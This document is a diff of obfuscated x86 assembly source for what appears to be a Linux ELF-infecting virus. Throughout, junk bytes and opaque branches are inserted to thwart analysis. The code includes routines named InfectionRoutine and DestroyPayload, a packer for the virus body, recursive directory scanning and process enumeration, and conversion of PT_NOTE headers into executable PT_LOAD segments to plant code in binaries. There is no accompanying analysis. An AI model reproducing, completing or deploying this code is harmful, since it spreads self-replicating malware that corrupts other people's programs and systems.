-    jmp         ..@y4NQukbkwPeO
-..@QWIMFFoewkp9:
-    jmp         ..@pKysl2wLF12v
-    jmp         ..@MfZ6he4x2IKp
-..@rILw5VuCdXsp:
-    mov         QWORD [r5+file.fileptr], 0x00
+db 0x49
+    jmp         $+4
+db 0x3c, 0x50
+    jmp         $+4
+db 0xcf, 0xee
+    jb          ..@zHf20fCsNJWV
+    jae         ..@zHf20fCsNJWV
+..@7zkJ94yCxPBb:
+    mov         r1, m6
+    add         r1, non_packed_len+PADDING
+    mov         r2, m8
     jmp         $+3
-db 0x34
-    js          ..@aaNLw9LlpHTO
-    jns         ..@aaNLw9LlpHTO
-..@m4dy8ADf367O:
+db 0x2e
+    jmp         $+5
+db 0x72, 0xfe, 0x61
+    jmp         $+5
+db 0x06, 0xfe, 0x0d
+    jl          ..@MI8cq6CMWXUz
+    jge         ..@MI8cq6CMWXUz
+..@w8VR0C2bgnQF:
+    add         r1, e_h.e_shentsize
+    mov         ax, WORD [r1]
+    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
+    jmp         $+5
+db 0x28, 0xa4, 0x8e
+    jmp         $+4
+db 0x94, 0x5f
+    jl          ..@dWvfhMmFT98e
+    jge         ..@dWvfhMmFT98e
+..@nKIu22vEbPLt:
+    add         r5, rax
+    add         r5, 1
+    jmp         ..@FvpNHFZl78ra
+    jmp         $+3
+db 0x54
+    js          ..@0TFSreZN7avO
+    jns         ..@0TFSreZN7avO
+..@611tBUgINy3K:
+    pop         r1
+    jmp         ..@2rWPr1Nv0NoB
+..@gGUmXOYXPMIK:
+    mov         rdi, QWORD [r5+file.fileptr]
+    jmp         ..@mHmEoXiu7NjD
+..@0TFSreZN7avO:
+    pop         r1
+    cmp         r1, 0x00
+    je          ..@RzdPHosprkxK
+    jmp         $+3
+db 0x1d
+    jl          ..@3FtceDVcgj4W
+    jge         ..@3FtceDVcgj4W
+..@naVkSRdjTKKL:
+    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
+    jmp         $+5
+db 0x33, 0x16, 0xb1
+    jmp         $+5
+db 0xfa, 0xd0, 0xa3
+    js          ..@ouZrOPgHJLzy
+    jns         ..@ouZrOPgHJLzy
+..@DPG9LbfuQgei:
+    mov         edx, 100000000b
+    jmp         $+4
+db 0x71, 0xf2
+    jmp         $+3
+db 0x9d
+    js          ..@fkZj1tYVPfrB
+    jns         ..@fkZj1tYVPfrB
+..@3hS0pnVkBRJH:
+    add         rax, r1
+    jb          ..@IlE8CzxGpNgV
+    jae         ..@IlE8CzxGpNgV
+..@53Mc727uXALt:
+    xor         rax, rax
+    xor         rcx, rcx
+    mov         rdi, m6
+    jmp         ..@aFecCX8SInui
+..@Pu5aY6fv4l0C:
+    mov         r1, r5
+    jmp         ..@ti9e8aBphQqq
+..@WSK8StwspNBB:
+    mov         r3, non_packed_len
+    call        MemMove
+    jl          ..@7zkJ94yCxPBb
+    jge         ..@7zkJ94yCxPBb
+..@RbCupw3Su7TY:
+    jmp         ..@oz0w6dKg0d2f
+    jmp         $+3
+db 0xc2
+    jmp         $+5
+db 0x2a, 0x7a, 0xfb
+    jmp         ..@FaUNt1bceu6m
+..@qt1I7nDQRdCR:
+    mov         r1d, eax
+    mov         r3d, 0x02
+    mov         eax, SYS_LSEEK
+    jl          ..@xUDVpy35guCE
+    jge         ..@xUDVpy35guCE
+..@gb8GclFahczY:
+    add         r4, rax
+    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
+    jl          ..@Ka5eOpjPkbWG
+    jmp         $+5
+db 0xea, 0xf2, 0x31
+    jmp         $+5
+db 0x24, 0x36, 0xe3
+    js          ..@VFeM7Uac7lDe
+    jns         ..@VFeM7Uac7lDe
+..@LYYdE28N9k6i:
+    je          ..@cGP4eVS9c0f1
+    jmp         ..@ZI0VvMoussGt
+..@HfdYQqV1YVi6:
+    jne         ..@b0M8V4CQhfqO
+    jmp         ..@xfTPgyrccQWI
+..@gdm0H23kuy9C:
+    rep         movsb
+    jmp         ..@Qvl4OciLIY97
+..@wWabWtHX888k:
+    je          ..@K20YvJKbMacp
+    jmp         ..@JdKyMMUhxL96
+..@7qvQzIaGimHh:
+    mov         r2, m5
+    jl          ..@MtBwkrQvV0d1
+    jge         ..@MtBwkrQvV0d1
+..@BWESNSRQAtOx:
+    jne         ..@E12MtQHXIwJa
+    jmp         $+4
+db 0x74, 0x56
+    jb          ..@etfoIz5aiHgu
+    jae         ..@etfoIz5aiHgu
+..@EfPDgmEdYbl1:
+    xor         rax, rax
+    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
+    jmp         $+4
+db 0xa8, 0x55
+    jb          ..@ZaxpSJZJOf1W
+    jae         ..@ZaxpSJZJOf1W
+..@DMv8HagVn3cq:
+    mov         BYTE [rsp+_LZSSE_OFF.character], al
+    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
+    jmp         ..@Grjy3p8I7hHH
+    jb          ..@YlYAIacUZF2V
+    jae         ..@YlYAIacUZF2V
+..@VFeM7Uac7lDe:
+    jmp         ..@5SlIFDCBMoj5
+    jmp         $+5
+db 0x56, 0x72, 0x01
+    jmp         $+5
+db 0x1a, 0x27, 0x50
+    jmp         ..@r0jEBtDpSJ32
+..@xlfIajT2jGiZ:
+    rep         cmpsb
+    jne         ..@ARx5EzeSo5IE
+    jl          ..@ARx5EzeSo5IE
+    jge         ..@ARx5EzeSo5IE
+..@WQihQLcGfcf2:
+    mov         rsi, r5
+    jmp         $+3
+db 0xfa
+    jb          ..@bnQl9mVciHRN
+    jae         ..@bnQl9mVciHRN
+..@Wesp2uJKn8Ae:
+    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
+    jb          ..@EtJdDshjWXXW
+    jae         ..@EtJdDshjWXXW
+..@vlw8G6ck9nSA:
+    add         ecx, 1
+    jmp         ..@c5UJBFEtM3SR
+..@UW9MoKrI49p8:
+    xor         rdx, rdx
+    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
+    jl          ..@DPG9LbfuQgei
+    jge         ..@DPG9LbfuQgei
+..@AWGNoDAzuc2m:
+    test        ax, ax
+    jz          ..@JrQf5sqP4je4
+    jb          ..@mLQhfk7cMGUC
+    jae         ..@mLQhfk7cMGUC
+..@dWvfhMmFT98e:
+    add         r1, 2
+    jmp         $+5
+db 0xe3, 0x3d, 0xce
+    jmp         ..@tHIgyKasS4JR
+AddSizeMappedFile:
+    jmp         ..@s2oS4vp4kJUZ
+..@1qvRUY99GgtH:
+    xor         rax, rax
+    jmp         $+4
+db 0x19, 0x1e
+    jl          ..@tE5ZdIYc6T3a
+    jge         ..@tE5ZdIYc6T3a
+..@xryDQ1y2I9LD:
+    cmp         bx, WORD [rsi+e_h.e_shnum]
+    jl          ..@IeWHdtvy0mkF
+    mov         rax, 1
+    jmp         $+3
+db 0xb6
+    jmp         $+4
+db 0x18, 0x0b
+    jb          ..@90lndXXin7rh
+    jae         ..@90lndXXin7rh
+..@z3e56uweUBMK:
+    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
+    jmp         $+3
+db 0x39
+    jmp         $+4
+db 0xee, 0xfc
+    jmp         ..@lhd4BZJ8awDg
+..@nnfXH979z2cH:
+    push        r5
+    jmp         $+5
+db 0x05, 0x10, 0x47
+    jb          ..@aoon4D8YUFEz
+    jae         ..@aoon4D8YUFEz
+..@bMw3eRIC6lrR:
+    cmp         BYTE [r1+16], ET_DYN
+    jmp         $+5
+db 0xd6, 0xdf, 0x0b
+    jl          ..@vLMeYDjrNmE5
+    jge         ..@vLMeYDjrNmE5
+..@ipFKcvr45wQl:
+    jmp         ..@cGP4eVS9c0f1
+    jmp         ..@5Xxh6Tlgi9LX
+..@AZNY8vcQkTVa:
+    pop         r5
+    jmp         $+3
+db 0x10
+    jmp         $+5
+db 0xf4, 0x49, 0x41
+    js          ..@uswTHaCXDIQL
+    jns         ..@uswTHaCXDIQL
+..@nJOLs7KRiFEA:
+    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
+    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
+    js          ..@WwnbxsLj9j2z
+    jns         ..@WwnbxsLj9j2z
+..@WJ81698VnNJX:
+    add         rsp, _LZSSE_OFF_size
+    jmp         $+3
+db 0x11
+    jmp         ..@hvoRkrj9Z3zl
+..@BjS5sCIfxMKQ:
+    mov         r3, rax
+    jmp         $+3
+db 0x35
+    jmp         $+5
+db 0x4c, 0x9b, 0x82
+    jl          ..@wc8sq7jlwphn
+    jge         ..@wc8sq7jlwphn
+..@ti9e8aBphQqq:
+    call_vsp    GetEnv
+    jmp         $+3
+db 0x41
+    jb          ..@LXCReLo1Ftbm
+    jae         ..@LXCReLo1Ftbm
+..@88KHKzk7iMJP:
+    cmp         BYTE [r1], 0x0
+    jmp         $+3
+db 0x7d
+    jmp         $+3
+db 0x4a
+    jmp         ..@kmMqVhldp3u8
+..@OLLN75csFyr5:
+    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
+    je          ..@92tgH7fsDH79
+    jne         ..@92tgH7fsDH79
+..@rZ7qNVQsHsgv:
+    mov         r1, QWORD [r5+file.filename]
+    cmp         BYTE [r1], '/'
+    jne         ..@R4FxM6IERCtl
+    jmp         ..@Fgiw9j80GDpd
+..@2FeOVF5N35MH:
 %ifdef X86_32
     mov         edi, DWORD [edi+file.filefd]
     push        ebp
     xor         ebp, ebp
 %endif
     jmp         $+3
-db 0x32
-    jmp         $+4
-db 0x58, 0xaa
-    jmp         $+4
-db 0x5d, 0x37
-    jmp         $+5
-db 0x6a, 0x52, 0x34
-    jb          ..@lE12NndRsRdq
-    jae         ..@lE12NndRsRdq
-..@ZsvSNf7dJ8lb:
-%ifdef X86_32
-    xor         eax, eax
-    xor         ebx, ebx
-%endif
-    jmp         $+5
-db 0x63, 0xd0, 0x5b
-    jmp         $+5
-db 0x92, 0x26, 0x0f
-    jb          ..@67pC09vXOZ3P
-    jae         ..@67pC09vXOZ3P
-..@6oFBFbm5iZQH:
-    mov         rsi, rdi
-    jmp         $+5
-db 0xa1, 0x9d, 0x56
-    jmp         ..@1KoEGiYgOF3S
-..@C9BjFJJF4PTQ:
-    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
-    jmp         $+4
-db 0x89, 0x50
+db 0xd1
     jmp         $+3
-db 0x2e
-    jmp         ..@ZpbUa3hFwlwU
-..@4lVGqbyt8kzO:
+db 0xb3
+    jl          ..@tFrW7VuAK6e3
+    jge         ..@tFrW7VuAK6e3
+..@WwnbxsLj9j2z:
+    jl          ..@558pDbgxYslW
+    jmp         $+4
+db 0x4d, 0xde
+    js          ..@pNPXcdf9P64o
+    jns         ..@pNPXcdf9P64o
+..@3tNBhpLHsnY3:
+    mov         rax, rdi
+    js          ..@2mxMqNlQBChT
+    jns         ..@2mxMqNlQBChT
+..@aqQJId3DOxJd:
+    pop         rax
+    js          ..@3tNBhpLHsnY3
+    jns         ..@3tNBhpLHsnY3
+..@FwrEdYABRkw3:
+    jnz         ..@deLH2ZVwwuI3
+    jmp         $+4
+db 0xce, 0x85
+    js          ..@QPGIokYsnVu8
+    jns         ..@QPGIokYsnVu8
+..@FVbnrmrs1RgV:
+    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
+    jl          ..@mRjmRZHpQhPm
+    jge         ..@mRjmRZHpQhPm
+..@JuywueUZvW7l:
+    add         r1, 1
+    jmp         ..@XRUKR0kN8b25
+..@cBMxW4sJqczX:
+    xor         r2, r2
+    jmp         ..@OslxAhAtn3Bf
+..@C1eZv0BFC7yJ:
     xor         rax, rax
-    jmp         $+5
-db 0x3a, 0xa3, 0xba
-    jl          ..@rchis7iqljwr
-    jge         ..@rchis7iqljwr
-..@BDEk2VWBSnzH:
-    add         rsp, _PROC_OFF_size
-    je          InfectionRoutine
-    jne         InfectionRoutine
-..@uQqs81K0AI4f:
-    pop         r1
-    cmp         r1, 0x00
-    je          ..@nRtImfModyJv
-    jmp         ..@eNZAwRuqqkgy
-..@ttOAdsWh1y1x:
-    cmp         rcx, QWORD [rdi+s_h.sh_size]
-    jge         ..@ka0jQnnnblRE
-    cmp         QWORD [rsi+rcx], DT_FLAGS_1
-    jl          ..@f8ZYfPsWGEfr
-    jge         ..@f8ZYfPsWGEfr
-..@UpkXpCzeawFY:
-    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
-    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
-    mov         DWORD [r2], PT_LOAD
-    jmp         $+5
-db 0xf6, 0xf0, 0xe9
-    js          ..@uaLv1ug2aDj3
-    jns         ..@uaLv1ug2aDj3
-..@cInF6ArauVeL:
-    test        al, al
-    jmp         ..@on0FKbBGuL5Z
-..@Jpw4BwKAjlK7:
-    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
-    add         rsp, _LZSSE_OFF_size
-    ret
-    jmp         $+3
-db 0xde
-    jmp         $+3
-db 0xb1
-    jb          UpdateSignature
-    jae         UpdateSignature
-..@UK8WKGhnb5YT:
-    mov         r1, r4
-    jmp         $+4
-db 0xe2, 0x89
-    je          ..@GSC8uJv2y7Lu
-    jne         ..@GSC8uJv2y7Lu
-..@5zE66LUpYUst:
-%ifdef X86_64
-    xor         rax, rax
-    xor         rdi, rdi
-%endif
-    jb          ..@FTK5uvvRRGNV
-    jae         ..@FTK5uvvRRGNV
-..@FfxFhndU7bMs:
-    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
-    jmp         ..@cHBrIBkLgoVX
-..@xqm2fJirjvJJ:
-    jmp         ..@ttOAdsWh1y1x
-    jmp         $+4
-db 0x9d, 0x4f
-    js          ..@ka0jQnnnblRE
-    jns         ..@ka0jQnnnblRE
-..@9K4QEOzg5fPE:
-    je          ..@DvWom2mYU3HG
-    jmp         $+5
-db 0x9b, 0x4b, 0xdf
-    jmp         $+3
-db 0x3c
-    jmp         ..@AqSZKmHmdrWy
-..@r906VBpOCNL4:
-    add         r5, 1
-    jl          ..@So894saMXbsk
-    jge         ..@So894saMXbsk
-..@hT0uUjCo1VYv:
-    mov         r5, r1
-    xor         rax, rax
-    jmp         $+3
-db 0xb2
-    js          ..@ePI4vMzga5R1
-    jns         ..@ePI4vMzga5R1
-..@UUiYVyRZYi4c:
-    add         rsp, _INFFILE_OFF_size
-    js          ..@054cato4LXbq
-    jns         ..@054cato4LXbq
-..@GSC8uJv2y7Lu:
-    mov         rax, [r5+file.filesize]
-    add         rax, r2
-    mov         r2, rax
-    jmp         $+3
-db 0x8c
-    jb          ..@fxcdh7nAPugj
-    jae         ..@fxcdh7nAPugj
-..@w8Z7fews0leV:
-    mov         r1d, eax
-    mov         r3d, 0x02
-    jmp         $+5
-db 0x36, 0x2e, 0xea
-    js          ..@Gw3M2VJhuWlh
-    jns         ..@Gw3M2VJhuWlh
-..@kXAAJ7PiPK4t:
-    mov         QWORD m5, 0x01
-    jmp         $+5
-db 0xb5, 0x20, 0x5b
-    jmp         ..@kcyKEucwC1HK
-..@sFoTWZufsLXw:
-    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
-    sub         r1, r4
-    jmp         $+4
-db 0x75, 0x70
-    jb          ..@SpAWFW4KycJU
-    jae         ..@SpAWFW4KycJU
-..@ivKP0DeHmZcF:
-    mov         QWORD [r5+file.fileptr], rax
-    xor         rax, rax
-    jmp         ..@pND99SDFJXmC
-    jmp         $+3
-db 0xe4
-    jmp         $+5
-db 0xc7, 0x22, 0x1e
-    jmp         ..@CBw5mMcFQ45P
-..@Mrh0MoD2KLuS:
     xor         rbx, rbx
-    js          ..@kwK632gyAST4
-    jns         ..@kwK632gyAST4
-..@GbvNTfagsbSZ:
-%ifdef X86_64
-    syscall
-%endif
-    js          ..@T4Tp1S4qMh9V
-    jns         ..@T4Tp1S4qMh9V
-..@9TuPDvn8qdiK:
-    mov         rax, SYS_FORK
-    jl          ..@4kAGtYF209QB
-    jge         ..@4kAGtYF209QB
-..@UOxCvMUvgG9u:
-    mov         ecx, WINDOW_LENGTH*2
-    jmp         ..@wfZJsal6p2cD
-..@ln0Rik1zYHIz:
-    test        r2, r2
-    jnz         ..@lsrxRNxO1dmY
-    mov         r1, r5
+    mov         al, BYTE [rdi]
     jmp         $+5
-db 0x53, 0x3b, 0xce
+db 0xe2, 0xe0, 0x7c
+    jmp         ..@DMv8HagVn3cq
+..@IriRmcrWM58o:
+    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
+    jmp         $+4
+db 0xe5, 0x01
     jmp         $+3
-db 0xb4
-    jmp         ..@lFqLzxzmaoAy
-..@eS6kJkMCOlAt:
-    VAR         packed, status
-    jb          ..@4ZDE2zgVmwnW
-    jae         ..@4ZDE2zgVmwnW
-..@0UQVTgcJs5sR:
+db 0xd1
+    js          ..@H2uflChhbadf
+    jns         ..@H2uflChhbadf
+..@RNBEKprEyYtf:
+    jz          ..@gcIgl41igXcn
+    jmp         ..@S3Tu4SPEY4if
+..@FZFrNryPZlU0:
+    cmp         DWORD [r2+rax], PT_NOTE
+    jne         ..@fEZYZfYiXlPL
+    add         r2, rax
+    js          ..@3Osun3h9m88i
+    jns         ..@3Osun3h9m88i
+..@wORN9LOXlfnZ:
+    mov         BYTE [rdi], al
+    jmp         $+3
+db 0xa8
+    jb          ..@NMPApKGAWw8J
+    jae         ..@NMPApKGAWw8J
+..@UaHgTkrnephY:
+    mov         BYTE [r1], 0x00
+    jmp         ..@SC5NgB7EcbW3
+..@fd0fMSuLNTzK:
+    mov         r3, r4
+    mov         r2, m6
+    jmp         $+4
+db 0x69, 0xba
+    jmp         $+4
+db 0x63, 0xf3
+    jl          ..@TFIJ1m0WvM70
+    jge         ..@TFIJ1m0WvM70
+..@z03l69SjKtJw:
+    push        r3
+    jmp         $+5
+db 0x6e, 0x17, 0xab
+    jmp         ..@tnlQWRI74ZDU
+..@tfJb39ROecoI:
+    push        rax
+    js          ..@xcJAVtwS8bU8
+    jns         ..@xcJAVtwS8bU8
+..@s2oS4vp4kJUZ:
+    push        r4
+    push        r5
+    xor         r4, r4
+    jmp         $+3
+db 0x90
+    jmp         $+3
+db 0x0d
+    jmp         $+5
+db 0xfb, 0xa0, 0xd7
+    jl          ..@JpUHAHTziuB7
+    jge         ..@JpUHAHTziuB7
+..@YbHiqcIxYmDk:
+    sub         rsp, _LZSSE_OFF_size
+    jmp         $+4
+db 0x78, 0x55
+    jmp         ..@z3e56uweUBMK
+..@asYunRcCUT72:
+    mov         rsi, rdi
+    jmp         $+3
+db 0xc2
+    jmp         $+4
+db 0xc8, 0x7e
+    jmp         $+3
+db 0x75
+    jb          ..@xY73kzQhpMQT
+    jae         ..@xY73kzQhpMQT
+..@QgGokKcGlq3I:
+    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
+    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
+    jmp         $+3
+db 0x62
+    jl          ..@WJ81698VnNJX
+    jge         ..@WJ81698VnNJX
+..@deLH2ZVwwuI3:
+    shr         edx, 1
+    test        edx, edx
+    jnz         ..@qjamrc8Zkrya
+    jmp         $+3
+db 0x20
+    jl          ..@F5fl1l2ePLuS
+    jge         ..@F5fl1l2ePLuS
+..@HHMH1QTmd0ga:
+    lea         r1, [rsp+_INFDIR_OFF.buffer]
+    js          ..@xAqfyvYECtTD
+    jns         ..@xAqfyvYECtTD
+..@VokoT8rXSPuX:
+    OFILE       QWORD [r2], r4
+    jb          ..@kF610wwLqtH1
+    jae         ..@kF610wwLqtH1
+..@kDdjOSsxIOp6:
+    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
+    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
+    jmp         $+5
+db 0xd4, 0x20, 0x3c
+    je          ..@oRIIsOKnwQqg
+    jne         ..@oRIIsOKnwQqg
+..@WhpQIqB4Bbmo:
+    jmp         ..@33Q4If3rtkYg
+    jb          ..@JrQf5sqP4je4
+    jae         ..@JrQf5sqP4je4
+..@ds0Qm8DOLW7U:
+    jmp         ..@fDgo3tTEMuNL
+    jmp         $+3
+db 0xcb
+    jl          ..@sv2ZjJ5lBsEf
+    jge         ..@sv2ZjJ5lBsEf
+..@f8MMphwCNwOe:
     mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
-    jmp         $+5
-db 0xb9, 0x0e, 0xf4
-    jl          ..@N9Mo6es9etec
-    jge         ..@N9Mo6es9etec
-..@W8IRcwkOikd0:
-    xor         rax, rax
-    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
-    or          BYTE [rsp+_LZSSE_OFF.bits], al
-    jmp         $+5
-db 0x89, 0x16, 0xdb
-    jmp         $+4
-db 0x36, 0x31
-    jmp         ..@wZrav6LPEbqq
-..@jLSNbcFWHopA:
-    sub         rcx, rax
-    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
-    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
-    jmp         $+4
-db 0x4f, 0x2a
-    jb          ..@OaEDdqOW903L
-    jae         ..@OaEDdqOW903L
-..@qVphEtHpxWcs:
-    add         rsp, _PAYLOAD_OFF_size
-    jmp         $+4
-db 0x71, 0x20
-    jl          ..@UdFBplhdGWJS
-    jge         ..@UdFBplhdGWJS
-..@FV1tqsRXDtun:
-    lea         rdi, [rsp+_LZSSE_OFF.buffer]
+    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
+    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
     jmp         $+3
-db 0xcf
-    je          ..@T9Jjw6rKg5WH
-    jne         ..@T9Jjw6rKg5WH
-..@8TI8pLRyyz9L:
-    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
-    jmp         $+5
-db 0xbf, 0x89, 0x4c
+db 0x27
+    jmp         ..@KDyl77Nevxfa
+..@wc8sq7jlwphn:
+    call_vsp    Strncmp
     jmp         $+4
-db 0xd3, 0x50
-    jl          ..@iXlhLaWBaXn1
-    jge         ..@iXlhLaWBaXn1
-..@cHBrIBkLgoVX:
-    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
+db 0xe3, 0x51
+    jmp         $+4
+db 0xc8, 0xf5
+    jl          ..@AWGNoDAzuc2m
+    jge         ..@AWGNoDAzuc2m
+..@X2XK3cqDiXZ3:
+    mov         r5, [rsp+_NBF_OFF.file]
+    mov         r1, QWORD [r5+file.fileptr]
+    jmp         $+3
+db 0x9b
+    jb          ..@LWhXC9HX8Hwm
+    jae         ..@LWhXC9HX8Hwm
+..@wUVMi5w87VJ2:
+    mov         r3, r2
+    jmp         ..@EYKfcEkgsGn4
+..@W8aWR0JOSzYq:
+    lea         r1, [rsp+_INFDIR_OFF.buffer]
     jmp         $+5
-db 0xce, 0xce, 0x29
-    jb          ..@HLdlnD92s7FX
-    jae         ..@HLdlnD92s7FX
-..@Egs1JIkX3bSo:
-    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
-    jmp         $+5
-db 0x02, 0x6a, 0xe5
-    js          ..@PU0sbR5fBVXP
-    jns         ..@PU0sbR5fBVXP
-..@nHdjWfiGAtQT:
-    syscall
+db 0x80, 0x33, 0x49
+    jl          ..@DzflMao0AsxA
+    jge         ..@DzflMao0AsxA
+..@P9eJzPAnxrp9:
+    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
+    call        IsNum
     test        eax, eax
-    jnz         ..@lHA1dfwVsdfi
+    jmp         $+5
+db 0x0d, 0xb8, 0xc0
+    jmp         ..@7syp8lfBLtw1
+..@az5roZGdhsEm:
+    xor         rcx, rcx
+    mov         rdi, m7
+    jmp         ..@htprqlefq5Hb
+..@eZgpzd7Y37PK:
+    mov         r3, rax
+    and         r5, (PAGE_SIZE-1)
+    jmp         ..@PEUVk47jwmlL
+..@QO2ioFcHPdap:
+    mov         ax, dx
     jmp         $+3
-db 0x0a
-    jl          ..@0nAN7EFrqDC3
-    jge         ..@0nAN7EFrqDC3
-..@616NPtyqPn63:
-    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
-    jb          ..@Sya94H1xCtd9
-    jae         ..@Sya94H1xCtd9
-..@BIOGBd0jmG7v:
-    mov         ax, WORD [r1+linux_dirent.d_reclen]
-    js          ..@JZSI56vJgarr
-    jns         ..@JZSI56vJgarr
-..@huxosuvGD6CT:
-    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
+db 0x02
     jmp         $+4
-db 0x4c, 0x74
-    jmp         ..@9P1WbWKHQH3G
-..@DF2lhsewMw1E:
+db 0x9d, 0x75
+    je          ..@IdIyO6AfnuAn
+    jne         ..@IdIyO6AfnuAn
+..@ikgPTaTG2OSC:
+    mov         r2, QWORD [r1+e_h.e_phoff]
+    jmp         ..@UqoHUG7h3iVp
+..@ea6y2kJGRO6Q:
+    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
+    call        Strcpy
+    mov         BYTE [r1], 0x00
+    jmp         $+5
+db 0x3d, 0xd9, 0x8b
+    js          ..@W8aWR0JOSzYq
+    jns         ..@W8aWR0JOSzYq
+..@t72eQN8DIfP3:
+    push        r1
+    jb          ..@6MaP5NLZJnsu
+    jae         ..@6MaP5NLZJnsu
+..@y1qLUpfx4vE3:
+    jmp         ..@cPJMfmdalc2W
+    jmp         ..@fEZYZfYiXlPL
+..@VBOd5pmHZyKq:
+    cmp         rax, (-1)
+    je          ..@cPJMfmdalc2W
+    jb          ..@fd0fMSuLNTzK
+    jae         ..@fd0fMSuLNTzK
+..@BeckXTiHvYQ6:
+    jne         ..@cS6c66HTlUaz
+    jmp         $+4
+db 0x1c, 0x2f
+    js          ..@7qvQzIaGimHh
+    jns         ..@7qvQzIaGimHh
+..@IlE8CzxGpNgV:
+    pop         r1
+    mov         r2, QWORD [r1+file.filesize]
+    cmp         rax, r2
+    jmp         $+4
+db 0xbd, 0x06
+    jmp         ..@BWESNSRQAtOx
+..@NRGNa6W3oCUn:
+    CFILE       DWORD [r5+file.filefd]
+    jmp         $+5
+db 0x07, 0x36, 0x10
+    jmp         ..@9vHlxQj499aM
+..@rzmYlC2dkt0q:
+    mov         r2, original_virus_len-non_packed_len
+    call        LzssEncoder
+    jmp         $+5
+db 0xdd, 0xed, 0x59
+    jmp         $+4
+db 0xbe, 0xdb
+    js          ..@AKKpTyEdzWi5
+    jns         ..@AKKpTyEdzWi5
+..@tHIgyKasS4JR:
+    mov         ax, WORD [r1]
+    jmp         $+3
+db 0xda
+    jmp         $+4
+db 0x55, 0x7f
+    js          ..@EL2u7S8kz1Ne
+    jns         ..@EL2u7S8kz1Ne
+..@P9K9gnW58pSG:
+    jne         ..@dHBJw1fYedmk
+    xor         rcx, rcx
+    jmp         $+5
+db 0x13, 0xf5, 0xdb
+    jmp         ..@u2671wA8w3oE
+..@4gjhzjLOmt6y:
+    or          bx, ax
+    jmp         $+4
+db 0xe9, 0x7f
+    jmp         $+3
+db 0xba
+    js          ..@qjamrc8Zkrya
+    jns         ..@qjamrc8Zkrya
+..@mU56aDurDmUw:
+    cmp         eax, 0x03
+    jb          ..@yBbajFDp4b40
+    jae         ..@yBbajFDp4b40
+..@KJvTHENEDQxJ:
+    pop         r3
+    pop         r2
+    jmp         $+3
+db 0x19
+    jmp         ..@ZP0tJIpC5Yac
+..@AAeU2EO7h7Nu:
+    jle         ..@r0jEBtDpSJ32
+    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
+    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
+    jmp         $+4
+db 0x87, 0x9f
+    jmp         ..@Ka5eOpjPkbWG
+..@EQOmeEaGQwBu:
+    sub         r2, 1
+    jmp         $+4
+db 0x1c, 0x40
+    jb          ..@02DoeAJ124yA
+    jae         ..@02DoeAJ124yA
+..@KF0eJeiscMqz:
 %ifdef X86_64
+    mov         edx, r10d
     mov         r10d, 0x01
     mov         r8d, DWORD [r8+file.filefd]
 %endif
-    jmp         $+5
-db 0x36, 0xed, 0xc8
-    jmp         ..@rufJA1mpg7vH
-..@4kAGtYF209QB:
-    syscall
-    test        eax, eax
-    jnz         ..@LJRX9uDEVLn3
     jmp         $+4
-db 0xc1, 0x5a
-    jb          ..@2DKso2BiCrTh
-    jae         ..@2DKso2BiCrTh
-..@7lt5UwcyllIx:
-%ifdef X86_64
-    xor         rax, rax
-    xor         rdi, rdi
-    xor         rdx, rdx
-%endif
-    jmp         $+3
-db 0xe8
-    js          ..@5a7S5yXSWwj2
-    jns         ..@5a7S5yXSWwj2
-..@QWOi7apm6q45:
-    mov         r1, rax
-    jl          ..@A9VKNpFY7riK
-    jge         ..@A9VKNpFY7riK
-..@3ic6DhI0ASvE:
-    push        r5
-    jmp         $+4
-db 0xa3, 0xaa
-    jl          ..@4mIu1UioB46k
-    jge         ..@4mIu1UioB46k
-..@VzwrAbq0mqaJ:
-    pop         r5
-    jmp         $+3
-db 0x48
-    js          ..@3hsRmOzXhkpT
-    jns         ..@3hsRmOzXhkpT
-DestroyPayload:
-    jmp         ..@DLpNmgqGJ5R6
-..@yQCo0WuuTd0F:
-    xor         r2, r2
-    jmp         $+4
-db 0xf7, 0x9e
-    jmp         $+5
-db 0x04, 0xd0, 0xe1
-    jmp         ..@BJf69DvPhaVt
-..@rB4GETD5ifYp:
-    cmp         rax, 0x00
-    jmp         ..@Pmf2jTsNK6XL
-..@YY3KMG19jVCY:
-    ret
-    jmp         $+3
-db 0xb2
-    jmp         CreatePayload
-..@Y0SfeYiv2Pdo:
-    and         r3, 0xfff 
-    mov         rbx, 0x1000
-    sub         rbx, r3
-    jmp         $+3
-db 0xac
-    jmp         $+5
